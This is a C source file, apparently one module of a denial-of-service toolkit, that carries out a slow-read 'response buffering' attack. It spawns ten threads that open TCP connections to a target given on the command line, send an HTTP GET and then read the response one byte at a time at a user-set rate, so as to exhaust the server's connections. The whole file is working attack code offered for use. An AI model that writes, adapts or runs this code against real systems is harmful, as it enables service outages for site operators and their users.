#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/receiver.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/body_buffering.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
#define RESPONSE_BUFFERING_CNT 20

// session counting
unsigned long g_resbuf_num_total;
unsigned long g_resbuf_num_generated_in_sec;
// from main()
char g_resbuf_src_ip[16] = { 0, };
char g_resbuf_dest_ip[16] = { 0, };
unsigned int g_resbuf_src_mask;
unsigned int g_resbuf_dest_mask;
unsigned int g_resbuf_dest_port_start;
unsigned int g_resbuf_dest_port_end;
unsigned int g_resbuf_request_per_sec;
// thread
pthread_mutex_t g_resbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_resbuf_before_time;
struct timespec g_resbuf_now_time;

void response_buffering_print_usage(void)
{
	printf("response buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_response_buffering(void *data)
{
	int thread_id = *((int*) data);
	//making tcp connection
	int sock = -1;
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(g_resbuf_dest_ip);
	servaddr.sin_port = htons(g_resbuf_dest_port_start);
	int response_buffering_cnt = 0;
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_resbuf_mutex);
		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
			if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
				perror("sock creation failed\n");
			}
			if (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
				perror("connect failed\n");
			}
			char http_request[] = GET_METHOD;
			if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
				perror("get send err\n");
			}
			response_buffering_cnt = 0;
		}
		// wait a second
		if (g_resbuf_num_generated_in_sec >= g_resbuf_request_per_sec) {
			pthread_cond_wait(&g_resbuf_cond, &g_resbuf_mutex);
		}
		// time checking
		time_check(&g_resbuf_mutex, &g_resbuf_cond, &g_resbuf_before_time, &g_resbuf_now_time, &g_resbuf_num_generated_in_sec);
		// read a character
		char buffer[1];
		int recv_size = read(sock, buffer, sizeof(buffer));
		g_resbuf_num_generated_in_sec++;
		g_resbuf_num_total++;
		response_buffering_cnt++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_resbuf_mutex);
	}
	close(sock);
	return NULL;
}

void *response_buffering_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_resbuf_mutex);
		time_check(&g_resbuf_mutex, &g_resbuf_cond, &g_resbuf_before_time, &g_resbuf_now_time, &g_resbuf_num_generated_in_sec);
		pthread_mutex_unlock(&g_resbuf_mutex);
	}
	return NULL;
}

void response_buffering_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		response_buffering_print_usage();
		return;
	}
	split_ip_mask_port(argv,
			g_resbuf_src_ip,
			g_resbuf_dest_ip,
			&g_resbuf_src_mask,
			&g_resbuf_dest_mask,
			&g_resbuf_dest_port_start,
			&g_resbuf_dest_port_end);
	g_resbuf_num_generated_in_sec = 0;
	g_resbuf_num_total = 0;
	memset(&g_resbuf_before_time, 0, sizeof(struct timespec));
	memset(&g_resbuf_now_time, 0, sizeof(struct timespec));
	g_resbuf_request_per_sec = atoi(argv[3]);
	if (g_resbuf_request_per_sec == 0)
		g_resbuf_request_per_sec = __UINT_MAXIMUM__;
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Body Buffering attack to %s using %d threads\n", g_resbuf_dest_ip, num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_response_buffering, (void *)&thread_ids[i]);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
	}
	pthread_create(&threads[i], NULL, response_buffering_time_check, (void*)&thread_ids[i]);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	pthread_mutex_destroy(&g_resbuf_mutex);
	printf("Body Buffering attack finished.\n");
	pthread_exit(NULL);
	return;
}
